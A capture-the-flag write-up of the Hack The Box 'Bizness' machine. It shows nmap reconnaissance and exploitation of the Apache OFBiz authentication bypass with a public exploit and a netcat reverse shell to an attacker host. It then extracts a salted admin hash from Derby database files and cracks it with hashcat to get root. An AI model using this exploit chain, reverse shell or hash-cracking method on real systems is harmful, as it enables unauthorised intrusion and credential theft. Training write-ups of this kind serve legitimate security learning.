![Bizness](https://github.com/amalcew/htb-writeups/assets/73908014/05936d43-efa6-4367-af40-6a78576d445c)

## Reconnaissance & port scanning

As always, let's start with port scanning using `nmap`

```bash
# Nmap 7.94SVN scan initiated Wed Feb 28 18:27:16 2024 as: nmap -v -sV -sC --open -vvv -oA logs/initial_recon/initial 10.10.11.252
Nmap scan report for 10.10.11.252 (10.10.11.252)
Host is up, received syn-ack (0.026s latency).
Scanned at 2024-02-28 18:27:16 CET for 16s
Not shown: 997 closed tcp ports (conn-refused)
PORT    STATE SERVICE  REASON  VERSION
22/tcp  open  ssh      syn-ack OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC0B2izYdzgANpvBJW4Ym5zGRggYqa8smNlnRrVK6IuBtHzdlKgcFf+Gw0kSgJEouRe8eyVV9iAyD9HXM2L0N/17+rIZkSmdZPQi8chG/PyZ+H1FqcFB2LyxrynHCBLPTWyuN/tXkaVoDH/aZd1gn9QrbUjSVo9mfEEnUduO5Abf1mnBnkt3gLfBWKq1P1uBRZoAR3EYDiYCHbuYz30rhWR8SgE7CaNlwwZxDxYzJGFsKpKbR+t7ScsviVnbfEwPDWZVEmVEd0XYp1wb5usqWz2k7AMuzDpCyI8klc84aWVqllmLml443PDMIh1Ud2vUnze3FfYcBOo7DiJg7JkEWpcLa6iTModTaeA1tLSUJi3OYJoglW0xbx71di3141pDyROjnIpk/K45zR6CbdRSSqImPPXyo3UrkwFTPrSQbSZfeKzAKVDZxrVKq+rYtd+DWESp4nUdat0TXCgefpSkGfdGLxPZzFg0cQ/IF1cIyfzo1gicwVcLm4iRD9umBFaM2E=
|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFMB/Pupk38CIbFpK4/RYPqDnnx8F2SGfhzlD32riRsRQwdf19KpqW9Cfpp2xDYZDhA3OeLV36bV5cdnl07bSsw=
|   256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOjcxHOO/Vs6yPUw6ibE6gvOuakAnmR7gTk/yE2yJA/3
80/tcp  open  http     syn-ack nginx 1.18.0
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to https://bizness.htb/
443/tcp open  ssl/http syn-ack nginx 1.18.0
|_ssl-date: TLS randomness does not represent time
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| tls-nextprotoneg: 
|_  http/1.1
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to https://bizness.htb/
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=UK
| Issuer: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=UK
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-12-14T20:03:40
| Not valid after:  2328-11-10T20:03:40
| MD5:   b182:2fdb:92b0:2036:6b98:8850:b66e:da27
| SHA-1: 8138:8595:4343:f40f:937b:cc82:23af:9052:3f5d:eb50
| -----BEGIN CERTIFICATE-----
| MIIDbTCCAlWgAwIBAgIUcNuUwJFmLYEqrKfOdzHtcHum2IwwDQYJKoZIhvcNAQEL
| BQAwRTELMAkGA1UEBhMCVUsxEzARBgNVBAgMClNvbWUtU3RhdGUxITAfBgNVBAoM
| GEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZDAgFw0yMzEyMTQyMDAzNDBaGA8yMzI4
| MTExMDIwMDM0MFowRTELMAkGA1UEBhMCVUsxEzARBgNVBAgMClNvbWUtU3RhdGUx
| ITAfBgNVBAoMGEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZDCCASIwDQYJKoZIhvcN
| AQEBBQADggEPADCCAQoCggEBAK4O2guKkSjwv8sruMD3DiDi1FoappVwDJ86afPZ
| XUCwlhtZD/9gPeXuRIy66QKNSzv8H7cGfzEL8peDF9YhmwvYc+IESuemPscZSlbr
| tSdWXVjn4kMRlah/2PnnWZ/Rc7I237V36lbsavjkY6SgBK8EPU3mAdHNdIBqB+XH
| ME/G3uP/Ut0tuhU1AAd7jiDktv8+c82EQx21/RPhuuZv7HA3pYdtkUja64bSu/kG
| 7FOWPxKTvYxxcWdO02GRXs+VLce+q8tQ7hRqAQI5vwWU6Ht3K82oftVPMZfT4BAp
| 4P4vhXvvcyhrjgjzGPH4QdDmyFkL3B4ljJfZrbXo4jXqp4kCAwEAAaNTMFEwHQYD
| VR0OBBYEFKXr9HwWqLMEFnr6keuCa8Fm7JOpMB8GA1UdIwQYMBaAFKXr9HwWqLME
| Fnr6keuCa8Fm7JOpMA8GA1UdEwEB/wQFMAMBAf8wDQYJKoZIhvcNAQELBQADggEB
| AFruPmKZwggy7XRwDF6EJTnNe9wAC7SZrTPC1gAaNZ+3BI5RzUaOkElU0f+YBIci
| lSvcZde+dw+5aidyo5L9j3d8HAFqa/DP+xAF8Jya0LB2rIg/dSoFt0szla1jQ+Ff
| 6zMNMNseYhCFjHdxfroGhUwYWXEpc7kT7hL9zYy5Gbmd37oLYZAFQv+HNfjHnE+2
| /gTR+RwkAf81U3b7Czl39VJhMu3eRkI3Kq8LiZYoFXr99A4oefKg1xiN3vKEtou/
| c1zAVUdnau5FQSAbwjDg0XqRrs1otS0YQhyMw/3D8X+f/vPDN9rFG8l9Q5wZLmCa
| zj1Tly1wsPCYAq9u570e22U=
|_-----END CERTIFICATE-----
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Feb 28 18:27:32 2024 -- 1 IP address (1 host up) scanned in 15.90 seconds
```

What is interesting, the machine broadcast its certificate - this will be important later during initial foothold part.

After adding the provided IP to `/etc/hosts` it is time to visit the page. The page is pretty empty, excluding the footer, which reveals what is hosted on the page:
![01-page](https://github.com/amalcew/htb-writeups/assets/73908014/d806d749-4e28-464e-ad51-dec4c8dab436)

The so-called **Apache OFBiz** has two critical vulnerabilities designated as [CVE-2023–49070 and CVE-2023–51467](https://medium.com/@maltamas/apache-ofbiz-authentication-bypass-vulnerability-cve-2023-49070-and-cve-2023-51467-8ef010759d66).
The paper hints also interesting directory - `/webtools/control/ping` and primarily `/webtools/control/`, which returns this page:

![02-webtools](https://github.com/amalcew/htb-writeups/assets/73908014/32f40a6a-abad-4eb5-824c-c5e58753ae43)

The link redirects to login page, which sadly refuses default credentials proposed by the previous page. 

![03-admin_page](https://github.com/amalcew/htb-writeups/assets/73908014/518d32d3-f44f-473c-87de-de8cf2715f41)

Trying approach with `/webtools/control/ping` page, we achieve significant results:

![04-rce](https://github.com/amalcew/htb-writeups/assets/73908014/c0124c22-821d-447c-8c9e-d5f807811fe1)

This behavious assures that page is indeed vulnerable. Searching for potential exploitation we can find [another paper](https://letsdefend.io/blog/exploitation-analysis-of-apache-ofbiz-zero-day-vulnerabilities-cve-2023-49070-cve-2023-51467/) describing this CVE and pointing to the [exploit](https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass) 

## Initial foothold

Gaining initial foothold required some tweaking with the reverse shell, as typical bash or Python shell didn't work with this machine.
Finally I've gained access using Netcat reverse shell and specyfing https (as machine used public key):

```bash
> python3 exploit.py --url https://bizness.htb --cmd 'nc -e /bin/bash xx.xx.xx.xx 1234'         
[+] Generating payload...
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
[+] Payload generated successfully.
[+] Sending malicious serialized payload...
[+] The request has been successfully sent. Check the result of the command.
```

```bash
> nc -lnvp 1234
listening on [any] 1234 ...
connect to [xx.xx.xx.xx] from (UNKNOWN) [10.10.11.252] 54644
id
uid=1001(ofbiz) gid=1001(ofbiz-operator) groups=1001(ofbiz-operator)
```

This approach was enough to read the standard user flag:

```bash
ls /home
ofbiz
cd /home/ofbiz
ls
user.txt
cat user.txt
bf37************************6c8d
```

## Privileges escalation

Escalation to root was pretty nasty, as it required a lot of searching for the valid trace. The first rabbit hole was a presence of `AdminUserLoginData.xml`, hidden under `/opt/ofbiz/framework/resources/templates` containing a hash of the password. Sadly, the has was unbreakable with usage of password dictionaries.

The next step was a discovery of Derby database located in `/opt/ofbiz/runtime/data/derby/ofbiz`. As the search was exhausting, it was also fruitful. One of the partition file, `/opt/ofbiz/runtime/data/derby/ofbiz/seg0/c54d0.dat` contained a hash of interest.

```bash
ofbiz@bizness:/opt/ofbiz$ cat /opt/ofbiz/runtime/data/derby/ofbiz/seg0/c54d0.dat
... SNIP ...
    <map-HashMap>
        <map-Entry>
            <map-Key>
                <std-String value="updatedUserLogin"/>
            </map-Key>
            <map-Value>
                <eeval-UserLogin createdStamp="2023-12-16 03:40:23.643" createdTxStamp="2023-12-16 03:40:23.445" currentPassword="$SHA$d$*************************2I"
enabled="Y" hasLoggedOut="N" lastUpdatedStamp="2023-12-16 03:44:54.272" lastUpdatedTxStamp="2023-12-16 03:44:54.213" requirePasswordChange="N" userLoginId="admin"/>
            </map-Value>
        </map-Entry>
        <map-Entry>
            <map-Key>
                <std-String value="locale"/>
            </map-Key>

... SNIP ...
```

The hash is utilizomg salting, which enhances security of the hash. The `SHA` stands for the algorithm and `d` is the salt.

The way to crack this hash is to sanitize it and that, use `hashcat` which allows for cracking salted password. For SHA1 hashes, `hashcat` uses special mode `120`. Used wordlist is `rockyou.txt`

```bash
> hashcat -m 120 -a 0 -d 1 "b8************************************62:d" /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

... SNIP ...

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimim salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 0 secs

b8************************************62:d:m***********s
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 120 (sha1($salt.$pass))
Hash.Target......: b8************************************62:d
Time.Started.....: Wed Mar 13 19:41:11 2024 (1 sec)
Time.Estimated...: Wed Mar 13 19:41:12 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  5558.4 kH/s (0.11ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 1478656/14344385 (10.31%)
Rejected.........: 0/1478656 (0.00%)
Restore.Point....: 1476608/14344385 (10.29%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: *** -> ***
Hardware.Mon.#1..: Util: 26%

Started: Wed Mar 13 19:40:53 2024
Stopped: Wed Mar 13 19:41:12 2024
```

Using cracked password, we can simply login as root and read the final flag.

```bash
ofbiz@bizness:/opt/ofbiz/runtime/data/derby/ofbiz/seg0$ su - root
Password: 
root@bizness:~# cat /root/root.txt 
76****************************21
```
